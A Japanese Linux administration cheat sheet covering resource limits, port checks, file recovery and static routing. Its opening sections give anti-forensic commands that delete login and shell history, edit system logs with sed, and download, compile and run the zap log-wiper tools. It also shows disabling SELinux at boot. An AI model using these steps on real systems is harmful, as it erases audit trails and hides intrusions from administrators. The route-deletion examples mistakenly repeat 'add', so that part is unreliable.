## 履歴削除

```
sudo rm /var/log/wtmp
sudo touch /var/log/wtmp
sudo rm /root/.bash_history
sudo rm /root/.viminfo
rm ~/.bash_history
rm ~/.viminfo
unset HISTFILE
```

### ログ

 ファイル名 | ログの用途                     | 主な格納先 | 格納タイプ
------------|--------------------------------|------------|------------
 utmp       | 現在のユーザー情報を記録       | /var/run   | バイナリ
 wtmp       | ログインの履歴を記録           | /var/log   | バイナリ
 lastlog    | ユーザーの最終ログイン時を記録 | /var/log   | バイナリ
 cron       | cronの実行結果を保存           | /var/log   | テキスト
 maillog    | メール関連                     | /var/log   | テキスト
 messages   | システムメッセージ、各種ソフト | /var/log   | テキスト
 secure     | セキュリティ関連               | /var/log   | テキスト
 xferlog    | ftp関連                        | /var/log   | テキスト

#### 改ざん

```
# テキスト系ファイルの改ざん
sed -e '/hogehoge/d' /var/log/messages > /tmp/messages

# zap2 で wtmp を改ざん
cd /tmp/
curl -LO http://www.kozupon.pgw.jp/download/wzap.c
gcc -o wzap wzap.c
./wzap
who ./wtmp.out
mv -f wtmp.out wtmp
chown root.utmp wtmp

# zap
curl -LO www.ussrback.com/UNIX/penetration/log-wipers/zap2.c
gcc -o zap zap2.c
./zap
```


## GRUB からselinux をOFFに

```
selinux=0 single
```
## システムリソースの上限を確認 (ulimit -a)

```
ulimit -a
# max memory size    = 物理メモリの使用サイズ上限
# open files         = ファイルディスクリプタ数の上限
# cpu time           = CPU時間の上限
# max user processes = プロセス数の上限
```

## ポートを使用しているプロセスを調査 (lsof)

```
sudo lsof -i:3306
```

## 疎通確認

```
## TCP 80
nc -z -w 5 -v www.example.com 80
## TCP 80-81
nc -z -w 5 -v www.example.com 80-81
## UDP 68
nc -u -z -w 5 -v www.example.com 68
```

## ファイルの復旧(ext3,4限定)

```
# 実行するとRECOVERED_FILES ディレクトリに復元ファイルができる
extundelete --after [unitxtime] --restore-all /dev/sda1
sudo extundelete /dev/sdc2 --after `date --date='2012-01-01 00:00' '+%s'`
```

## ネットワーク
### 静的ルーティング設定

```
# ルーティングテーブル表示
netstat -nr
```

#### routeコマンド

```
# network の追加
sudo route add -net 172.31.0.0 gw 10.13.0.145 netmask 255.255.0.0 eth0
# host の追加(eth0 の指定がなければ任意でルーティングが設定できるethで設定される)
sudo route add -host 172.31.0.10 gw 10.13.0.145 eth0

# network の削除
sudo route add -net 172.31.0.0 gw 10.13.0.145 netmask 255.255.0.0 eth0
# host の削除
sudo route add -host 172.31.0.10 gw 10.13.0.145 eth0
```

#### ipコマンド

```
# network の追加
sudo ip route add 172.31.0.0/16 via 10.13.0.145 dev eth0
# host の追加(/32で指定する)
sudo ip route add 172.31.0.10/32 via 10.13.0.145 dev eth0

# network の削除
sudo ip route del 172.31.0.0/16
# host の削除
sudo ip route del 172.31.0.10/32
```

#### 永続的な追加(Ubuntu)

##### /etc/network/if-up.d/static-routesで設定する方法
```
cat <<EOM > /etc/network/if-up.d/static-routes
#!/bin/sh
/sbin/route add -net 172.31.0.0 gw 10.13.0.145 netmask 255.255.0.0 dev eth0 // networkの場合
/sbin/route add -host 172.31.0.10 gw 10.13.0.145 eth0 // hostの場合
EOM
sudo chmod +x /etc/network/if-up.d/static-routes
```

##### /etc/network/interfacesに設定する方法

cat /etc/network/interfaces

```
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

# The loopback network interface
auto lo
iface lo inet loopback

# The primary network interface
auto eth0
iface eth0 inet dhcp
    post-up route add -net 172.31.0.0/16 gw 10.13.0.145  // networkの場合
    post-up route add -host 172.31.0.10/32 gw 10.13.0.145  // hostの場合
```

#### 永続的な追加(CentOS)

```
cat /etc/sysconfig/network-scripts/route-eth0 
# Static route for metadata service
172.31.0.0/16 via 10.13.0.145 dev eth0 // networkの場合
172.31.0.10/32 via 10.13.0.145 dev eth0 // hostの場合

sudo service network restart
```
